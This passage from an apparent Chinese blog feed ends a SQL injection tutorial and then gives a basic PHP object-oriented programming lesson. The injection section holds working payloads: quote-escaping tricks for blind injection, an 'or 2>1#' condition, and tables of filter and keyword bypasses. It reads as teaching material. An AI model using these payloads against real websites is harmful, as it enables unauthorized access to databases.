<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin\&amp;password&#x3D;123456#</span><br><span class="line">将这个拼接进去，\就可以将第2个单引号转义掉</span><br><span class="line">select * from users where username&#x3D;&#39;admin\&#39; and password&#x3D;&#39;123456#&#39;;</span><br><span class="line">这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是admin\&#39; and password&#x3D;这个整体</span><br><span class="line">接下来构造password为or 2&gt;1#</span><br><span class="line">select * from users where username&#x3D;&#39;admin\&#39; and password&#x3D;&#39; or 2&gt;1#&#39;;</span><br><span class="line">上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注</span><br></pre></td></tr></table></figure>
<ul>
<li>将 utf-8 转换为 utf-16 或 utf-32</li>
</ul>
<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 � ‘。</p>
<p>可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">&#x27;|iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="数字被过滤-拦截绕过"><a href="#数字被过滤-拦截绕过" class="headerlink" title="数字被过滤/拦截绕过"></a>数字被过滤/拦截绕过</h3><p>数字被屏蔽时，用响应函数结果来构造。</p>
<ul>
<li>ceil() ：为向上取整函数</li>
<li>floor()：为向下取整函数</li>
<li>! ~~：起到取反的效果</li>
<li>pi() ：π值</li>
<li>version()：利用当前版本号进行数字的构造</li>
<li>false：值为0</li>
<li>true：值为1</li>
</ul>
<h3 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h3><p>当等于号<code>=</code>背过滤时，可以使用：like,in 等字符替换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; or &#39;1&#39; IN (&#39;1234&#39;)#</span><br><span class="line">?id&#x3D;1&#39; or 1 like 1#</span><br></pre></td></tr></table></figure>


<h3 id="其他关键字过滤-拦截绕过"><a href="#其他关键字过滤-拦截绕过" class="headerlink" title="其他关键字过滤/拦截绕过"></a>其他关键字过滤/拦截绕过</h3><p>关键字被过滤时，可以通过双写或大小写、其他编码例如十六进制、URL编码来进行绕过：</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>双写</th>
<th>大小写</th>
<th>其他编码</th>
<th>符号</th>
</tr>
</thead>
<tbody><tr>
<td>and</td>
<td>aandnd</td>
<td>and</td>
<td>an\x64</td>
<td>&amp;&amp;</td>
</tr>
<tr>
<td>select</td>
<td>selselectect</td>
<td>SelECt</td>
<td>selec\x74</td>
<td></td>
</tr>
<tr>
<td>or</td>
<td>oorr</td>
<td>oR</td>
<td>o\x72</td>
<td>||</td>
</tr>
<tr>
<td>union</td>
<td>uniunionon</td>
<td>uNioN</td>
<td>unio\x6e</td>
<td></td>
</tr>
</tbody></table>
<p>当被拦截的时候，通常寻找其他函数进行代替。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.cnblogs.com/lcamry/p/5763169.html" >MYSQL注入天书之开天辟地<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/253#toc-1" >MYSQL报错注入的一点总结<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP面向对象基础</title>
    <url>/2021/01/25/PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<blockquote>
<p>引入：计算机编程在历史的发展长河中，经历了多次<code>版本变革</code>，变化的轨迹是伴随着硬件的发展和人们对于计算机的认知以及需求。</p>
</blockquote>
<ul>
<li><p>机器语言：即开发者（科学家）使用<code>0</code>和<code>1</code>组成命令，然后在特定计算机上执行</p>
<ul>
<li><p>优点：执行效率高</p>
</li>
<li><p>缺点：开发难度大、移植性差、开发成本高</p>
</li>
</ul>
</li>
<li><p>汇编语言：开发者使用简洁<code>英文字母</code>和<code>符号</code>组成，让计算机读取后根据符号进行加工执行</p>
<ul>
<li>优点：指令简单明了、推广性高</li>
<li>缺点：移植性差、功能简单</li>
</ul>
</li>
<li><p>高级计算机语言：开发者使用类似自然语言的<code>符号</code>组成，高级语言根据编程思想分为<code>面向过程编程</code>和<code>面向对象编程</code>两种，然后系统对程序代码进行编译（需要第三方编译器）然后执行</p>
<ul>
<li>优点：移植性强、可读性强、推广性非常高</li>
<li>缺点：执行效率降低</li>
</ul>
</li>
</ul>
<p><strong>面向过程编程</strong></p>
<ul>
<li><p>将要解决的问题（功能需求）分解成具体的步骤，然后通过<strong>函数编程</strong>实现每一个步骤，最后通过函数规定好的顺序调用完成</p>
</li>
<li><p>面向过程编程思想的优点</p>
<ul>
<li>能够针对步骤拆分，进行模块化封装（函数）</li>
<li>可以实现代码复用，从而节省开发成本</li>
</ul>
</li>
<li><p>面向过程编程思想的缺点</p>
<ul>
<li>不够灵活维护，流程一旦确定就必须按照既定方式执行到底。</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>小结</strong></p>
</blockquote>
<p>1、计算机编程从对开发人员要求极高到要求不高，是一代代人坚持不懈的结果</p>
<p>2、面向对象编程是目前最为符合人类思维逻辑的一种编程思想</p>
<h2 id="一、面向对象编程思想"><a href="#一、面向对象编程思想" class="headerlink" title="一、面向对象编程思想"></a>一、面向对象编程思想</h2><h3 id="面向对象编程思想概念及原理"><a href="#面向对象编程思想概念及原理" class="headerlink" title="面向对象编程思想概念及原理"></a>面向对象编程思想概念及原理</h3><blockquote>
<p><strong>定义</strong>：面向对象编程也叫做OOP编程（Objected Oriented Programming），是一种基于面向过程的开发思想。与面向过程强调分解事务步骤相似，面向对象更需要追求事务操作的“主体”，也就是<code>对象</code></p>
</blockquote>
<ol>
<li>面向对象编程是一种编程思想，不是一种具体技术</li>
<li>面向对象是在面向过程基础之上发展而来，因此也是一种模块化编程思想（有函数）</li>
<li>面向对象能够更加方便的实现代码的重复利用（适用于大型项目）</li>
<li>在面向对象思维中，任何动作的执行或者数据都属于对象（一切皆对象）</li>
</ol>
<blockquote>
<p><strong>小结</strong></p>
</blockquote>
<ol>
<li>面向对象编程是一种编程思想，与技术无关</li>
<li>面向对象编程的本质是增加数据和功能的操作主体，即对象</li>
<li>面向对象中所有的数据和功能都是由主体（对象）来调用和操作</li>
</ol>
<h2 id="二、面向对象基础"><a href="#二、面向对象基础" class="headerlink" title="二、面向对象基础"></a>二、面向对象基础</h2><blockquote>
<p><strong>思考</strong>：按照面向对象编程思想逻辑，先编写好对应的功能函数，然后再放到某个主体中。那么已经写好的函数如何放到某个主体中去呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：上述图片中描述的是思想的实现，在实际编写代码的过程中，肯定不是这么去实现的。面向对象中，对于一些思想产物有一些不同的称呼。</p>
</blockquote>
<h3 id="1-面向对象关键字说明【掌握】"><a href="#1-面向对象关键字说明【掌握】" class="headerlink" title="1.面向对象关键字说明【掌握】"></a>1.面向对象关键字说明【掌握】</h3><blockquote>
<p><strong>定义</strong>：面向对象关键字说明，即在面向对象思想设计的程序中，有一些关键的结构用词。在面向对象中，关键结构包括以下几个：</p>
</blockquote>
<ol>
<li>类：class，是定义面向对象主体的最外层结构，用来包裹主体的数据和功能（函数）。类是一类具有共性事务的代表，代表的是事务的共性。</li>
<li>对象：object，是某类事务的具体代表，也是实际数据和功能操作的具体单元，也被称之为实例（instance）</li>
<li>实例化：new，从一个抽象的概念(类)得到一个符合抽象概念的具体实例(对象)的过程</li>
<li>类成员：member，指类class结构中的所有内容，类成员里有三种</li>
</ol>
<ul>
<li>方法：method，本质是在类class结构中创建的函数，也称之为<code>成员方法</code>或者成员函数</li>
<li>属性：property，本质是在类class结构中创建的变量，也称之为<code>成员变量</code></li>
<li>类常量：constant，本质是在类class结构中创建的常量</li>
</ul>
<blockquote>
<p><strong>总结</strong>：面向对象基础中没有本质多出很多东西，基本只是将原来面向过程的内容进行一层包裹而已。</p>
</blockquote>
<hr>
<blockquote>
<p><strong>思考</strong>：面向对象编程到底是如何用代码实现这样的编程思想的呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：其实所有的编程都大同小异：编写程序–&gt;运行程序。只是根据不同的思想会有不同的关键字让系统识别而已。</p>
</blockquote>
<h3 id="2-面向对象简单技术实现【掌握】"><a href="#2-面向对象简单技术实现【掌握】" class="headerlink" title="2.面向对象简单技术实现【掌握】"></a>2.面向对象简单技术实现【掌握】</h3><blockquote>
<p><strong>定义</strong>：面向对象思维的实现，就是利用面向对象提供的关键字和代码规范来进行编程，而这里面最核心的两个部分就是类class和对象object</p>
</blockquote>
<ol>
<li>定义类基本语法：class 类名{}</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//定义一个空类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Nothing</span></span>&#123;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>类class是一种结构，如果写好没有语法错误的情况下，代码不会执行（与函数定义一样），也无法打印输出</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">clsss Nothing&#123;&#125;</span><br><span class="line">var_dump(Nothing);		<span class="comment">//错误，提示未定义的常量</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>类的命名规范：类的命名规范与函数类似，区别在于人为的通常会将类名的首字母大写</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//有效类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My1</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My_1</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_My1</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无效类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 1<span class="title">My</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> 1<span class="title">_my</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>如果碰到多单词组成的类名，通常使用驼峰法</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>类无法直接访问，需要得到类的具体对象才能访问，可以通过<strong>实例化</strong>new来实现对象的创建：new 类名[()]</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">new</span> My;			<span class="comment">//创建一个My类的对象</span></span><br><span class="line"><span class="keyword">new</span> My();		<span class="comment">//创建一个My类的对象</span></span><br></pre></td></tr></table></figure>
<ol start="6">
<li>对象创建后可以直接使用或者打印，但是为了方便后续使用，通常使用变量保存实例化的对象</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My</span></span>&#123;&#125;</span><br><span class="line">var_dump(<span class="keyword">new</span> My);	<span class="comment">//直接打印输出对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> My;		<span class="comment">//保存对象</span></span><br><span class="line">var_dump(<span class="variable">$m</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印结果</span></span><br><span class="line"><span class="keyword">object</span>(My)<span class="comment">#1 (0) &#123; &#125; object(My)#2 (0) &#123; &#125;</span></span><br><span class="line"><span class="keyword">object</span>：对象</span><br><span class="line">(My)：类名 </span><br><span class="line"><span class="comment">#1：编号</span></span><br><span class="line">(<span class="number">0</span>)：成员变量（属性）个数   </span><br><span class="line">&#123;&#125;：具体成员变量信息（键值对）</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>通过class关键字 + 类名 +{}创建类</li>
<li>类是一种结构，不会自动运行，也不能输出</li>
<li>通过new 类名实例化对象得到类的具体对象（具象）</li>
<li>可以通过new实例化无限个对象</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：上面定义的类就是个空类，里面什么都没有，类里面能够放些什么东西呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：通常空类没有什么价值，需要往类里填充<code>类成员</code>，这样的类才有价值，这样的类实例化得到的对象才有意义。</p>
</blockquote>
<h3 id="3-类成员【掌握】"><a href="#3-类成员【掌握】" class="headerlink" title="3.类成员【掌握】"></a>3.类成员【掌握】</h3><blockquote>
<p><strong>定义</strong>：类成员，指直接定义在类结构{}内部的一级成员，即直接依赖{}的成员。在PHP中类成员有三种：成员变量（属性），成员方法（成员函数）和类常量</p>
</blockquote>
<ol>
<li>成员变量：就是在类结构{}下直接定义的变量，但是定义的方式与普通变量稍微有点不同，需要在变量名字前使用一个关键字public，定义语法：public 变量名字 [= 值];，成员变量可以赋值也可以不赋值。</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义买家类：买家有姓名，有钱</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">	<span class="comment">//$name;			//错误</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;		 <span class="comment">//正确：没有赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$money</span> = <span class="number">0</span>;	 <span class="comment">//正确：有赋值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>成员变量访问：成员变量必须通过对象才能进行访问，也就是需要先通过实例化得到对象，然后通过对象实现对成员变量的增删改查：访问语法：$对象名-&gt;属性名;</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#定义买家类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;	</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$money</span> = <span class="number">0</span>;	 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Buyer();</span><br><span class="line"><span class="comment">//访问属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>-&gt;money;</span><br><span class="line"><span class="comment">//修改属性</span></span><br><span class="line"><span class="variable">$b</span>-&gt;money = <span class="number">1000</span>;</span><br><span class="line"><span class="comment">//删除属性</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>-&gt;name);</span><br><span class="line"><span class="comment">//新增属性</span></span><br><span class="line"><span class="variable">$b</span>-&gt;age = <span class="number">20</span>;</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：删除属性和新增属性通常使用较少，更多的属性操作是访问和修改</p>
<ol start="3">
<li>成员方法：就是在类结构{}下定义的函数，函数内部的内容与原来函数结构一样，可以有分支、循环结构等</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义买家类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>成员方法访问：成员方法也是需要通过对象进行访问的，访问语法为：$对象名-&gt;方法名字();</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义买家类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Buyer();</span><br><span class="line"><span class="variable">$b</span>-&gt;display();</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>类常量：类常量是在类结构{}下定义的常量，类常量的定义只能使用一种方式：const 常量名 = 值;</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义买家类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义类常量</span></span><br><span class="line">    <span class="keyword">const</span> PI = <span class="number">3.14</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：类常量不是由对象来进行访问，所以暂时不做访问讲解，到后面知识再讲。</p>
<ol start="6">
<li>类成员中：属性、类常量和方法都可以无限定义，但是定义的原则是相关性。除了以上三个类成员，不能在类结构{}中直接写其他任何代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;					<span class="comment">//错误</span></span><br><span class="line">    define(<span class="string">&#x27;PI&#x27;</span>,<span class="number">3.14</span>);	 			<span class="comment">//错误</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>)&#123; <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>&#125;	 <span class="comment">//错误</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>PHP类结构中有三种成员：属性、方法和类常量</li>
<li>类结构中只能有三种成员，不限数量，其他代码需要写到方法里面，否则报错</li>
<li>类中属性和方法的访问方式都是通过对象来调用：$对象-&gt;属性名/方法名()；注意属性名不带$符号</li>
<li>类中定义属性不能直接使用属性名，需要使用符号public修饰</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：属性本质是变量，只是放到类结构中而已，为什么一定要使用public呢？有什么用呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：在面向对象中，属性或者方法都是用来给对象访问的，但是有的时候并不是所有的内容都是允许对象在外部访问的，这个时候就出现<code>访问修饰限定符</code>来控制访问位置。</p>
</blockquote>
<h3 id="4-访问修饰限定符【掌握】"><a href="#4-访问修饰限定符【掌握】" class="headerlink" title="4.访问修饰限定符【掌握】"></a>4.访问修饰限定符【掌握】</h3><blockquote>
<p><strong>定义</strong>：访问修饰限定符，是一种用在属性或者方法前的修饰关键字，是用来控制属性或者方法的访问位置的。在PHP中访问修饰限定符分为三种：public、protected和private</p>
</blockquote>
<ol>
<li>首先需要明白一组概念类的内部和外部</li>
</ol>
<ul>
<li>类内部：是指类定义的内容内部，即类名后{}内部</li>
<li>类外部：是指类定义的外部内容，即类名后{}之外的所有地方</li>
<li>类成员的访问权限控制是内部访问（私有）、链内部访问（受保护）和全部访问（公有）</li>
</ul>
<ol start="2">
<li>public：公有，即表示所修饰的内容（属性或者方法）可以在当前类的内部访问，也可以在类的外部访问</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment">//公有属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>-&gt;count;				<span class="comment">//正常输出100</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>protected：受保护，即表示所修饰的内容只能在<code>类的内部</code>访问（在学习继承时再讲）</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment">//受保护属性</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$discount</span> = <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>-&gt;discount;				<span class="comment">//错误：受保护属性不允许在类外访问</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li>private：私有，即表示所修饰的内容只能在<code>当前类的内部</code>访问</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment">//私有属性</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>-&gt;money;				<span class="comment">//错误：私有属性不允许在类外访问</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>访问修饰限定符不只是限定属性，也用来限定方法</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment">//属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$discount</span> = <span class="number">0.8</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCount</span>(<span class="params"></span>)</span>&#123;&#125;	</span><br><span class="line">  <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getDiscount</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getMoney</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;&#125;					<span class="comment">#如果没有指定访问修饰限定符，默认public</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>访问修饰限定符分为三种：public、protected和private，访问权限依次降低</li>
<li>访问修饰限定符限定的是成员到底在哪里能被访问，私有和受保护都只能在类内部访问，公有可以在任何地方访问（但都必须是对象去访问）</li>
<li>属性必须写清楚访问修饰限定符，方法可以省去（不建议），因为系统默认是public</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：前面访问修饰限定符描述的只是在外部调用访问，怎么能够体现在类的内部访问呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：类的内部如果是在类结构{}后，除了类三种成员，不能有别的代码；但是类成员方法内部可以写任何代码，因此可以在类方法内部实现访问：此时方法运行的内部环境属于类内部。</p>
</blockquote>
<h3 id="5-类内部对象【掌握】"><a href="#5-类内部对象【掌握】" class="headerlink" title="5.类内部对象【掌握】"></a>5.类内部对象【掌握】</h3><blockquote>
<p><strong>定义</strong>：类成员属性和方法的访问必须通过对象才能访问，类外部可以通过实例化得到类对象从而实现成员访问，但是类内部又不能访问类外部的对象（未知），此时类的内部就内置了一个对象$this代表来访对象。</p>
</blockquote>
<ol>
<li>尝试在类内部方法中访问属性</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">  	<span class="keyword">protected</span> <span class="variable">$discount</span> = <span class="number">0.8</span>;</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$count</span>,<span class="variable">$discount</span>,<span class="variable">$money</span>;	<span class="comment">//全部错误：提示未定义的“变量”</span></span><br><span class="line">    &#125;					</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;getAll();</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：方法本质是定义在类内部的函数，因此受制于作用域的问题，在方法内部访问的变量系统认定为局部变量（必须内部定义或者参数传入），否则就会提示未定义</p>
<ol start="2">
<li>类内部访问类成员，需要通过对象来进行访问</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">  	<span class="keyword">protected</span> <span class="variable">$discount</span> = <span class="number">0.8</span>;</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="comment">//需要获取到对象名字：因为方法本身就是函数，访问外部全局变量可以通过global引入实现</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$s</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>-&gt;count,<span class="variable">$s</span>-&gt;discount,<span class="variable">$s</span>-&gt;money;		<span class="comment">#正确输出</span></span><br><span class="line">    &#125;					</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;getAll();</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>思考这样一个问题：类一开始定义好，但是对象实例化是在需要使用该类的时候来调用的，如何保证外部保存对象的变量一定是$s呢？对象可以创建多个，如果有多个对象变量，那内部怎么实现呢？如果系统内部能够检测到是哪个对象在调用方法，并且能够复制对应对象就好了，这个就是类成员方法<code>内置对象$this</code></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">100</span>;</span><br><span class="line">  	<span class="keyword">protected</span> <span class="variable">$discount</span> = <span class="number">0.8</span>;</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;count,<span class="keyword">$this</span>-&gt;discount,<span class="keyword">$this</span>-&gt;money;		<span class="comment">#正确输出</span></span><br><span class="line">    &#125;					</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;getAll();</span><br></pre></td></tr></table></figure>
<ol start="4">
<li><p>由上述代码可见：$this代表的是对象，而$this所在环境为类内部的方法内部，所以$this对象是在类内部访问，因此可以访问所有的属性和方法，不受访问修饰限定符限制</p>
</li>
<li><p>$this、class和new之间的关系原理</p>
</li>
</ol>
<ul>
<li><p>class是定义类结构，属于非执行段代码，因此会被加载到代码段（编译阶段）</p>
</li>
<li><p>new是实例化对象，先判定类在内存（代码段）是否存在</p>
<ul>
<li>类不存在，报错；</li>
